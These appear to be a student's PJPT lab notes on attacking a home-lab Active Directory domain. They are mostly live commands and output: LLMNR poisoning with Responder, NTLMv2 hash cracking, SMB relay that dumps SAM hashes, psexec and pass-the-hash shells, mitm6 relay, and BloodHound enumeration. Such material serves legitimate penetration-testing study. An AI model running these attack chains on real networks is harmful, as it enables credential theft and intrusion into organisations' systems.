#PJPT Commands


$$Attacking Active Directory: Initial Attack Vectors$$

### LLMNR Poisoning

LLMNR, also known as Link-Local Multicast Name Resolution. LLMNR is a protocol used to identify hosts in a network when DNS fails to do so.

Key Flaw we are able to intercept traffic, including the username and the hash this is a Man In the Middle Attack

![image.png](attachment:6151e28a-fcba-43c6-80ac-2ee6bbeea2b6:image.png)

<aside>
💡

Responder is the tool that we will utilize.

</aside>

LAB

```bash
                                                                                                                                                                                                               
┌──(kali㉿kali)-[~/pjpt]
└─$ sudo responder -I eth0 -dwv 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.126.130]
    Responder IPv6             [fe80::20c:29ff:fe4f:8a6]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-2WI442WEJ6F]
    Responder Domain Name      [89SJ.LOCAL]
    Responder DCE-RPC Port     [49447]

[+] Listening for events... 
```

Simulating attack by adding trying to connect to the attackers ip 

![image.png](attachment:60bf00b3-f25a-4b9c-8556-6832bd408f8b:image.png)

Below we were able to capture some username and hashes

```bash
[SMB] NTLMv2-SSP Client   : 192.168.126.132
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:49f06053f7fb8a1a:3EA5A4E2B553F3F1A94F11A4E7026F89:01010000000000000048E59209AEDB0180B9C1806684443200000000020008003800390053004A0001001E00570049004E002D00320057004900340034003200570045004A003600460004003400570049004E002D00320057004900340034003200570045004A00360046002E003800390053004A002E004C004F00430041004C00030014003800390053004A002E004C004F00430041004C00050014003800390053                         004A002E004C004F00430041004C00070008000048E59209AEDB0106000400020000000800300030000000000000000100000000200000ABB8AEFFEA91AFBC757C4EA093978E3145F0EA23528AF29BE01043338E528DDE0A0010000000000000000000000000000000                         00000900280063006900660073002F003100390032002E003100360038002E003100320036002E003100330030000000000000000000                                                                                                                               
[SMB] NTLMv2-SSP Client   : 192.168.126.132
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:d955c9d6b9c2229d:0A5521EFFBB06A2FB1451074F4CC46BD:01010000000000000048E59209AEDB01A9FF504E03BBF88A00000000020008003800390053004A0001001E00570049004E002D00320057004900340034003200570045004A003600460004003400570049004E002D00320057004900340034003200570045004A00360046002E003800390053004A002E004C004F00430041004C00030014003800390053004A002E004C004F00430041004C00050014003800390053                         004A002E004C004F00430041004C00070008000048E59209AEDB0106000400020000000800300030000000000000000100000000200000ABB8AEFFEA91AFBC757C4EA093978E3145F0EA23528AF29BE01043338E528DDE0A0010000000000000000000000000000000                         00000900280063006900660073002F003100390032002E003100360038002E003100320036002E003100330030000000000000000000                                                                                                                               
[SMB] NTLMv2-SSP Client   : 192.168.126.132
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:e75c7b434b2ed5c2:6A96DAD5087A6009CE34B41DFB49B802:01010000000000000048E59209AEDB0134B1D704D68899C500000000020008003800390053004A0001001E00570049004E002D00320057004900340034003200570045004A003600460004003400570049004E002D00320057004900340034003200570045004A00360046002E003800390053004A002E004C004F00430041004C00030014003800390053004A002E004C004F00430041004C00050014003800390053                         004A002E004C004F00430041004C00070008000048E59209AEDB0106000400020000000800300030000000000000000100000000200000ABB8AEFFEA91AFBC757C4EA093978E3145F0EA23528AF29BE01043338E528DDE0A0010000000000000000000000000000000                         00000900280063006900660073002F003100390032002E003100360038002E003100320036002E003100330030000000000000000000                                                                                                                               
[SMB] NTLMv2-SSP Client   : 192.168.126.132
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:7a5d74ec5f5bea59:4046D54675689D053DE4C53F151BB05A:01010000000000000048E59209AEDB01BBFBEF4141562E3F00000000020008003800390053004A0001001E00570049004E002D00320057004900340034003200570045004A003600460004003400570049004E002D00320057004900340034003200570045004A00360046002E003800390053004A002E004C004F00430041004C00030014003800390053004A002E004C004F00430041004C00050014003800390053                         004A002E004C004F00430041004C00070008000048E59209AEDB0106000400020000000800300030000000000000000100000000200000ABB8AEFFEA91AFBC757C4EA093978E3145F0EA23528AF29BE01043338E528DDE0A0010000000000000000000000000000000                         00000900280063006900660073002F003100390032002E003100360038002E003100320036002E003100330030000000000000000000                                                                                                                               
[PROXY] Received connection from 192.168.126.132
[PROXY] Client        : 192.168.126.132

```

Cracking the Hash

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ hashcat | grep NTLM                     
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/pjpt]
└─$ hashcat --help | grep NTLM
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
   
   
┌──(kali㉿kali)-[~/pjpt]
└─$ hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-AMD Ryzen 5 7600 6-Core Processor, 6924/13913 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

FCASTLE::MARVEL:e75c7b434b2ed5c2:6a96dad5087a6009ce34b41dfb49b802:01010000000000000048e59209aedb0134b1d704d68899c500000000020008003800390053004a0001001e00570049004e002d00320057004900340034003200570045004a003600460004003400570049004e002d00320057004900340034003200570045004a00360046002e003800390053004a002e004c004f00430041004c00030014003800390053004a002e004c004f00430041004c00050014003800390053004a002e004c004f00430041004c00070008000048e59209aedb0106000400020000000800300030000000000000000100000000200000abb8aeffea91afbc757c4ea093978e3145f0ea23528af29be01043338e528dde0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320036002e003100330030000000000000000000:Password1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: FCASTLE::MARVEL:e75c7b434b2ed5c2:6a96dad5087a6009ce...000000
Time.Started.....: Tue Apr 15 13:39:17 2025 (1 sec)
Time.Estimated...: Tue Apr 15 13:39:18 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   805.4 kH/s (1.96ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> whitetiger
Hardware.Mon.#1..: Util: 12%

Started: Tue Apr 15 13:39:05 2025
Stopped: Tue Apr 15 13:39:19 2025

```

  LLMNR Poisoning Mitigation

![image.png](attachment:b8c07634-a9b2-4cdb-a6a9-ac3c53f6b9ce:image.png)

## SMB Relay Attacks Overview

Instead of using a responder to crack the hashes, an SMB relay attack allows us to send the hashes to specific machines and possibly obtain access.

Requirements

SMB signing must be disable or not enforce 

To be truly useful, the relayed user credentials need to be the machine's administrator.

Identify host with SMB Signing

```bash
nmap —script=smb2-security-mode.nse -p445 10.0.0.0/24
```

Required, cant relay on Domain Controller

```bash
└─$ nmap --script=smb2-security-mode.nse -p445 192.168.126.131 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-15 13:54 EDT
Nmap scan report for 192.168.126.131
Host is up (0.00033s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:A1:3D:B1 (VMware)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/pjpt]
└─$ 

```

Can Relay

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ nmap --script=smb2-security-mode.nse -p445 192.168.126.132 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-15 13:55 EDT
Nmap scan report for 192.168.126.132
Host is up (0.00070s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:12:CF:B6 (VMware)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
                                                                
```

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ vim target.txt      
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/pjpt]
└─$ cat target.txt 
192.168.126.132
192.168.126.133

```

Turn off SMB and HTTP on responder

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ sudo mousepad /etc/responder/Responder.conf 
[sudo] password for kali: 

```

![image.png](attachment:2416663d-7aab-41f3-903b-af18e5c96836:image.png)

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ sudo responder -I eth0 -dPv                
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [ON]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

```

New Tab

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ ntlmrelayx.py -tf target.txt -smb2support            
Impacket v0.13.0.dev0+20250404.133223.00ced47 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay enabled

[*] Servers started, waiting for connections
[*] Received connection from MARVEL/fcastle at FRANKCASTLE, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.126.132 controlled, attacking target smb://192.168.126.132
[-] Authenticating against smb://192.168.126.132 as MARVEL/FCASTLE FAILED
[*] Received connection from MARVEL/fcastle at FRANKCASTLE, connection will be relayed after re-authentication
[ParseResult(scheme='smb', netloc='MARVEL\\FCASTLE@192.168.126.132', path='', params='', query='', fragment='')]
[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.126.132 controlled, attacking target smb://192.168.126.133
[*] Authenticating against smb://192.168.126.133 as MARVEL/FCASTLE SUCCEED
[*] All targets processed!
[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.126.132 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf6e376baa9f01be9d04fd5eccb1a1389
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:23fa26a09f785692e48be00c886556ac:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 192.168.126.133
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```

Defense 

![image.png](attachment:5812c933-2ee8-4fe7-9d52-395cf0289bb2:image.png)

## Gaining Shell Access

```bash
$ psexec MARVEL/fcastle:'Password1'@192.168.126.132
Impacket v0.13.0.dev0+20250404.133223.00ced47 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.126.132.....
[*] Found writable share ADMIN$
[*] Uploading file KsILUYRD.exe
[*] Opening SVCManager on 192.168.126.132.....
[*] Creating service WAuQ on 192.168.126.132.....
[*] Starting service WAuQ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

```

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ psexec administrator@192.168.126.132 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
Impacket v0.13.0.dev0+20250404.133223.00ced47 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.126.132.....
[*] Found writable share ADMIN$
[*] Uploading file uSZHeUqb.exe
[*] Opening SVCManager on 192.168.126.132.....
[*] Creating service fnIr on 192.168.126.132.....
[*] Starting service fnIr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

```

## IPv6 Attacks

Is acting as the DNS for the IPv6

Startup NTLM relay 

```bash
ntlmrelayx.py -6 -t ldaps://192.168.126.131 -wh fakewpad.marvel.locl -l lootme
Impacket v0.13.0.dev0+20250404.133223.00ced47 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections

```

```bash
sudo mitm6 -d marvel.local
```

To simulate the attack reboot a system

Defense

![image.png](attachment:6dbf9bf6-d21e-4bb0-903c-d10183b2872e:image.png)

$$

\huge Attacking Active Directory: Post Compromise Enumeration
$$

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ sudo ldapdomaindump ldaps://192.168.126.131 -u 'MARVEL\fcastle' -p Password1
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/pjpt]
└─$ ls
192.168.126.133_samhashes.sam  domain_computers.grep  domain_groups.grep  domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json  target.txt
arp.cache                      domain_computers.html  domain_groups.html  domain_policy.html  domain_trusts.html  domain_users.grep           hashes.txt
domain_computers_by_os.html    domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json  domain_users.html           pimpmykali

```

LDAP 

## BLOODHOUND

```bash
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/pjpt]
└─$ sudo neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2025-04-17 00:24:09.890+0000 INFO  Starting...
2025-04-17 00:24:10.372+0000 INFO  This instance is ServerId{3107fd34} (3107fd34-42b3-44c0-8c00-a7d350dbba66)
2025-04-17 00:24:11.227+0000 INFO  ======== Neo4j 4.4.26 ========
2025-04-17 00:24:12.354+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2025-04-17 00:24:12.360+0000 INFO  Setting up initial user from defaults: neo4j
2025-04-17 00:24:12.360+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=true, suspended=false)
2025-04-17 00:24:12.367+0000 INFO  Setting version for 'security-users' to 3
2025-04-17 00:24:12.368+0000 INFO  After initialization of system graph model component 'security-users' have version 3 and status CURRENT
2025-04-17 00:24:12.370+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2025-04-17 00:24:12.873+0000 INFO  Bolt enabled on localhost:7687.
2025-04-17 00:24:13.655+0000 INFO  Remote interface available at http://localhost:7474/
2025-04-17 00:24:13.657+0000 INFO  id: 25D830368939EB71BFC3A4DF786C979670084CBEC9948E017E00C22464F11DFB
2025-04-17 00:24:13.657+0000 INFO  name: system
2025-04-17 00:24:13.657+0000 INFO  creationDate: 2025-04-17T00:24:11.683Z
2025-04-17 00:24:13.657+0000 INFO  Started.
2025-04-17 00:25:42.486+0000 WARN  The client is unauthorized due to authentication failure.

```

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ sudo bloodhound            
[sudo] password for kali: 
(node:857818) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information
(node:857882) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.

```

```bash
kali㉿kali)-[~/pjpt/bloodhound]
└─$ sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns 192.168.126.131 -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: marvel.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (hydra-dc.marvel.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: hydra-dc.marvel.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: hydra-dc.marvel.local
INFO: Found 8 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SPIDERMAN.MARVEL.local
INFO: Querying computer: frankcastle.MARVEL.local
INFO: Querying computer: HYDRA-DC.MARVEL.local
INFO: Done in 00M 00S
                         
```

## Plumhound

```bash
sudo python3 PlumHound.py --easy -p root
```

```bash
┌──(kali㉿kali)-[/opt/PlumHound]
└─$ sudo python3 PlumHound.py -x tasks/default.tasks -p root 

        PlumHound 1.6
        For more information: https://github.com/plumhound
        --------------------------------------
        Server: bolt://localhost:7687
        User: neo4j
        Password: *****
        Encryption: False
        Timeout: 300
        --------------------------------------
        Tasks: Task File
        TaskFile: tasks/default.tasks
        Found 119 task(s)
        --------------------------------------

on 119:         Completed Reports Archive: reports//Reports.zip
         Executing Tasks |██████████████████████████████████████████████████| Tasks 119 / 119  in 2.7s (43.04/s) 

        Completed 119 of 119 tasks.

```

```bash
┌──(kali㉿kali)-[/opt/PlumHound]
└─$ cd reports 
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[/opt/PlumHound/reports]
└─$ ls
AdminGroups.csv                              DCSyncDirect.csv                            Kerberoastable_Users.html                   SchemaAdmins.html
AdminGroups.html                             DCSyncDirect.html                           LapsDeploymentCount.csv                     UserSessionsCount.html
AdminGroupsPopulatedCount.csv                DCSyncDirectNonDAUsers.csv                  LapsDeploymentCount.html                    Users_gt006MoOldPasswords.csv
AdminGroupsPopulatedCount.html               DCSyncDirectNonDAUsers.html                 LapsDeploymentCount-OS.csv                  Users_gt006MoOldPasswords.html
AdminsWithoutSensitiveFlag.html.csv          DCSyncDirectNonDCComputers.csv              LapsDeploymentCount-OS.html                 Users_gt012MoOldPasswords.csv
AdminsWithoutSensitiveFlag.html.html         DCSyncDirectNonDCComputers.html             LAPSNotEnabled.html                         Users_gt012MoOldPasswords.html
CertificateAuthorties.csv                    DomainAdmins.html                           LocalAdmin_Computers_.csv                   Users_gt060MoOldPasswords.csv
CertificateAuthorties.html                   DomainComputers.csv                         LocalAdmin_Computers_.html                  Users_gt060MoOldPasswords.html
CertificateTemplateEnrollRights.csv          DomainComputers.html                        LocalAdmin_Groups_Count.html                Users_gt120MoOldPasswords.csv
CertificateTemplateEnrollRights.html         DomainControllers.csv                       LocalAdmin_Groups.html                      Users_gt120MoOldPasswords.html
CertificateTemplates.csv                     DomainControllers.html                      LocalAdmins_Computers_count.html            Users_gt180MoOldPasswords.csv
CertificateTemplates_ESC1.csv                DomainControllers_ReadOnly.csv              LocalAdmin_UsersCount.html                  Users_gt180MoOldPasswords.html
CertificateTemplates_ESC1.html               DomainControllers_ReadOnly.html             LocalAdmin_Users.html                       Users_gt240MoOldPasswords.csv
CertificateTemplates_ESC2.csv                DomainGroups.csv                            OS_Count.csv                                Users_gt240MoOldPasswords.html
CertificateTemplates_ESC2.html               DomainGroups.html                           OS_Count.html                               Users_le01DOldPasswords.csv
CertificateTemplates_ESC3.csv                Domains.csv                                 OS_Unsupported_Count.csv                    Users_le01DOldPasswords.html
CertificateTemplates_ESC3.html               Domains.html                                OS_Unsupported_Count.html                   Users_lt07DOldPasswords.csv
CertificateTemplates_ESC6.csv                DomainTrusts.csv                            OS_Unsupported.csv                          Users_lt07DOldPasswords.html
CertificateTemplates_ESC6.html               DomainTrusts.html                           OS_Unsupported.html                         Users_lt30DOldPasswords.csv
CertificateTemplates_ESC8.csv                DomainUsers.csv                             OUs_ComputerCount.html                      Users_lt30DOldPasswords.html
CertificateTemplates_ESC8.html               DomainUsers.html                            OUs_GroupCount.html                         Users_NeverActive_Enabled.csv
CertificateTemplates.html                    EA_Sessions.html                            OUs_UserCount.html                          Users_NeverActive_Enabled.html
CertPublishers.html                          EnterpriseAdmins.html                       Owned-Computers-Groups-DirectDistinct.html  Users_NeverExpirePasswords.csv
Computers_LocalAdminEnumeration.csv          GMSA_CanReadPassword.csv                    Owned-Computers-Groups.html                 Users_NeverExpirePasswords.html
Computers_LocalAdminEnumeration.html         GMSA_CanReadPassword.html                   Owned-Computers.html                        Users_NoKerbReq.csv
Computers_MSSQL.csv                          GPOCreatorOwners.html                       Owned-Groups.html                           Users_NoKerbReq.html
Computers_MSSQL.html                         GPO_OU_Links.csv                            Owned-Objects-AdminTo-Direct.html           UsersnonadminAddMemberGroups.csv
Computers_UnconstrainedDelegation.csv        GPO_OU_Links.html                           Owned-Objects-GMSARead-Direct.html          UsersnonadminAddMemberGroups.html
Computers_UnconstrainedDelegation.html       GPOOwners-Detail.csv                        Owned-Objects.html                          UsersNotActive120mo.csv
Computers_UnconstrainedDelegationNonDC.csv   GPOOwners-Detail.html                       Owned-Objects-MemberOf-Direct.html          UsersNotActive120mo.html
Computers_UnconstrainedDelegationNonDC.html  GPOOwners-NonDA.csv                         Owned-Users-Groups-DirectDistinct.html      UsersNotActive12mo.csv
Computers_WithDescriptions.csv               GPOOwners-NonDA.html                        Owned-Users-Groups.html                     UsersNotActive12mo.html
Computers_WithDescriptions.html              GPOOwners-Summary.csv                       Owned-Users.html                            UsersNotActive60mo.csv
ConstrainedDelegation-All.csv                GPOOwners-Summary.html                      PreWindows2000.html.csv                     UsersNotActive60mo.html
ConstrainedDelegation-All.html               GPOs.csv                                    PreWindows2000.html.html                    UsersNotActive6mo.csv
ConstrainedDelegation-ComputersNonDC.csv     GPOs.html                                   ProtectedUsers.html                         UsersNotActive6mo.html
ConstrainedDelegation-ComputersNonDC.html    GPOs-NonDA-WithInterestingPermissions.csv   RDPableGroupsCount.html                     Users_PasswordNotRequired.html
ConstrainedDelegation-Users.csv              GPOs-NonDA-WithInterestingPermissions.html  RDPableGroups.html                          Users_PasswordNotRequiredNeverSet.html
ConstrainedDelegation-Users.html             Groups_CanResetPasswordsCount.html          Relationships-AuthenticatedUsers.html       Users_Sessions_Count.html
ConstrainedDelegation-UsersNonDA.csv         Groups-HighValue-members.csv                Relationships-DomainComputers.html          Users_Sessions.csv
ConstrainedDelegation-UsersNonDA.html        Groups-HighValue-members.html               Relationships-DomainUsers.html              Users_Sessions.html
DA_Sessions.html                             HuntComputersWithPassInDescription.html     Relationships-Everyone.html                 Users_UnconstrainedDelegation.csv
DCOwners.csv                                 HuntUsersWithChangeInDescription.html       Relationships-Guests.html                   Users_UnconstrainedDelegation.html
DCOwners.html                                HuntUsersWithPassInDescription.html         Relationships-PreW2KCA.html                 Users_userpassword.csv
DCOwners-Users.csv                           HuntUsersWithVPNGroup.html                  Relationships-Users.html                    Users_userpassword.html
DCOwners-Users.html                          index.html                                  Reports.zip                                 Workstations_RDP.html
                                                                                                                                                                          
```

```bash
firefox index.html  
```

$$Attacking Active Directory: Post Compromise Attack$$

## Pass Attacks

![image.png](attachment:9cd49bf1-1e88-40f1-b1f4-f54104a356bf:image.png)

```bash
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/pjpt]
└─$ crackmapexec smb 192.168.126.0/24 -u fcastle -d MARVEL.local -p Password1
SMB         192.168.126.131 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.126.132 445    FRANKCASTLE      [*] Windows 10 / Server 2019 Build 19041 x64 (name:FRANKCASTLE) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.126.133 445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.126.131 445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 
SMB         192.168.126.132 445    FRANKCASTLE      [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
SMB         192.168.126.133 445    SPIDERMAN        [+] MARVEL.local\fcastle:Password1 (Pwn3d!)

```

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ crackmapexec smb 192.168.126.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
SMB         192.168.126.132 445    FRANKCASTLE      [*] Windows 10 / Server 2019 Build 19041 x64 (name:FRANKCASTLE) (domain:FRANKCASTLE) (signing:False) (SMBv1:False)
SMB         192.168.126.131 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
